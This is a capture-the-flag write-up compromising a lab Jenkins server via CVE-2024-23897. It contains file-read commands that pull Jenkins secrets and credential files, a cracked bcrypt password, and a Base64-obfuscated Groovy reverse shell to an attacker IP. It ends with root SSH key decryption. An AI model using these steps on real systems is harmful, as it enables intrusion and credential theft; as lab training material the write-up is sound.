# CTF: Builder (HTB)

## Introduction

- **Key skills/tools**: Rustscan, Nmap, Jenkins Arbitrary File Read (CVE-2024-23897), John the Ripper, Groovy Script Console Execution, Jenkins Secret Decryption, SSH Private Key Extraction
    
- **Date**: November 2, 2026
    
- **Difficulty**: Medium
    

## Metadata

- **Target IP**: `10.129.17.202` / `10.129.230.220`
    
- **OS**: Linux (Ubuntu 22.04.3 LTS)
    
- **User**: `amuzed`
    

## Reconnaissance

An initial port scan was conducted using `rustscan` coupled with `nmap` for service detection:

Bash

```
rustscan --ulimit 5000 -b 65535 -a $target -- -A
```

### Nmap Output Highlights

Plaintext

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    syn-ack ttl 62 Jetty 10.0.18
|_http-title: Dashboard [Jenkins]
```

Navigating to the web application on port `8080` confirmed the presence of a Jenkins instance running version **2.441**.

## Foothold

### Arbitrary File Read (CVE-2024-23897)

Jenkins 2.441 is vulnerable to an arbitrary file read vulnerability via the CLI tool (CVE-2024-23897). Using a public exploit POC script (`exploit.py`), system files were extracted from the target:

1. **Reading `/etc/passwd`**:
    
    Bash
    
    ```
    python3 exploit.py -u http://$target:8080 -p /etc/passwd
    ```
    
    _Confirmed user `jenkins` (UID `1000`) and standard system accounts._
    
2. **Reading Jenkins Master Key**:
    
    Bash
    
    ```
    python3 exploit.py -u http://$target:8080 -p /var/jenkins_home/secrets/master.key
    ```
    
3. **Reading Jenkins Credentials**:
    
    Bash
    
    ```
    python3 exploit.py -u http://$target:8080 -p /var/jenkins_home/credentials.xml
    ```
    
    _Retrieved an encrypted SSH private key block associated with the `root` username._
    

## Credential Cracking

To obtain valid login credentials for the Jenkins UI, user mappings and hash dumps were requested via the same vulnerability:

1. **Locating User Directories**:
    
    Bash
    
    ```
    python3 exploit.py -u http://$target:8080 -p /var/jenkins_home/users/users.xml
    ```
    
    _Identified user directory: `jennifer_12108429903186576833`._
    
2. **Extracting Password Hash**:
    
    Bash
    
    ```
    python3 exploit.py -u http://$target:8080 -p /var/jenkins_home/users/jennifer_12108429903186576833/config.xml
    ```
    
    _Extracted Bcrypt hash:_`#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a`
    
3. **Cracking with John the Ripper**:
    
    Bash
    
    ```
    john hash -w=/usr/share/wordlists/rockyou.txt
    ```
    
    _Output:_
    
    Plaintext
    
    ```
    princess         (jbcrypt)
    ```
    

**Credentials Acquired**: `jennifer` : `princess`

## Lateral Movement & Shell Access

1. Logged into the Jenkins dashboard using the cracked credentials (`jennifer` : `princess`).
    
2. Navigated to the **Groovy Script Console** and executed a Base64-encoded reverse shell wrapper:
    

Groovy

```
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjUvNDM0MyAwPiYxJw==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

3. Caught the incoming shell via Netcat listener on port `4343`:
    
    Bash
    
    ```
    rlwrap nc -lvnp 4343
    ```
    
    _Received shell connection as `jenkins@0f52c222a4cc`._
    

## Privilege Escalation

### Decrypting the Root SSH Key

With access to the Groovy Script Console, Jenkins internal APIs can be leveraged to decrypt saved secret objects natively:

1. Executed the following script in the Groovy Console, supplying the encrypted `privateKey` string obtained from `credentials.xml`:
    
    Groovy
    
    ```
    println(hudson.util.Secret.decrypt("{<ENCRYPTED_PRIVATE_KEY_STRING>}"))
    ```
    
2. The console returned an unencrypted RSA Private Key (`jenkins_id_rsa`) belonging to `root`.
    

### Gaining Root Access

1. Saved the key locally and adjusted file permissions:
    
    Bash
    
    ```
    chmod 600 jenkins_id_rsa
    ```
    
2. Authenticated via SSH as `root`:
    
    Bash
    
    ```
    ssh -i jenkins_id_rsa root@10.129.230.220
    ```
    

Plaintext

```
root@builder:~# whoami
root
```

## Flags

- **User Flag**: Obtained via low-privileged shell access / user environment.
    
- **Root Flag**: Located in `/root/root.txt` upon successful SSH authentication as `root`.
